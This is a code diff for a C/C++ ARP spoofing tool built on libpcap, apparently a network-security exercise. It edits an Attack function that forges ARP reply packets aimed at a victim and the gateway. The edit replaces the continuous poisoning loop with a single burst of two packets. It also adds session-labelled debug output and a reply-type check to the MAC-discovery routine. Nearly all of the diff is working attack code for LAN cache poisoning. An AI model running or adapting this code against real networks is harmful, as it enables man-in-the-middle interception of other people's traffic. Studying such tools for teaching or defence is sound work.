@@ -32,15 +32,10 @@ void convert_mac(const char* data, char* cvrt_str, int s){
 }
 
 // ########## Sending contaminated ARP packets ##########
-// sip : gateway's ip
-// smac : attacker's mac
-// tip : victim's ip
-// tmac : victim's mac
-void* Attack(void* info){
+void Attack(void* info){
 	struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
 	struct in_addr src_in_addr, target_in_addr;
 	struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
-	
 	attack_packet->frame_type = htons(ARP_FRAME_TYPE);
 	attack_packet->mac_type = htons(ETHER_MAC_TYPE);
 	attack_packet->prot_type = htons(IP_PROTO_TYPE);
@@ -61,17 +56,15 @@ void* Attack(void* info){
 
 	bzero(attack_packet->padding, 18);
 
-	// 2 attack per 2.5 seconds
-	while(1){
-		for(int i = 0; i < 2; i++){
-			printf("\n----------_ARP %d_----------\n", PP->session_Number);
-			//Print_ARP(&attack_packet);
-			if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
-				perror("send packet error");
-				exit(1);
-			}
+	for(int i = 0; i < 2; i++){
+		printf("\n----------_ARP %d_----------\n", PP->session_Number);
+		printf("tip : %s\n", PP->tip);
+		printf("sip : %s\n", PP->sip);
+		//Print_ARP(&attack_packet);
+		if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
+			perror("send packet error");
+			exit(1);
 		}
-		sleep(2.5);
 	}
 }
 
@@ -132,8 +125,7 @@ void* find_Mac(void* info){
 	struct in_addr src_in_addr, target_in_addr;
 	char* sender_mac = (char*)malloc(sizeof(char) * 50);
 	if(sender_mac == NULL){ perror("sender_mac malloc error"); exit(1); }
-
-	printf("[ Starting to find %s mac address ]\n", PP->tip);
+	printf("[ < Session %d > / Starting to find < %s > mac address ]\n", PP->session_Number, PP->tip);
 
 	ah->frame_type = htons(ARP_FRAME_TYPE);
 	ah->mac_type = htons(ETHER_MAC_TYPE);
@@ -166,7 +158,7 @@ void* find_Mac(void* info){
 		temp = (struct ARP_header*)(packet);
 		//check_ARP(packet);
 
-		printf("[ send packet %d ]\n", count);
+		printf("[ < Session %d > / send packet to < %s > / count : %d ]\n", PP->session_Number, PP->tip, count);
 		if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(ah), 42) != 0){
 			perror("send packet error");
 			exit(1);
@@ -191,7 +183,7 @@ ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
 		printf("temp->sender_ip_addr : %s\n", a);
 		printf("ah->target_ip_addr : %s\n", b);
 
-		if((temp->frame_type == htons(ARP_FRAME_TYPE)) && (memcmp(temp->sender_ip_addr, ah->target_ip_addr, sizeof(temp->sender_ip_addr)) == 0)){
+		if((temp->frame_type == htons(ARP_FRAME_TYPE)) && (temp->op == htons(OP_ARP_REPLY)) && (memcmp(temp->sender_ip_addr, ah->target_ip_addr, sizeof(temp->sender_ip_addr)) == 0)){
 			printf("[ Success to access %d ]\n", count);
 			break;
 		}
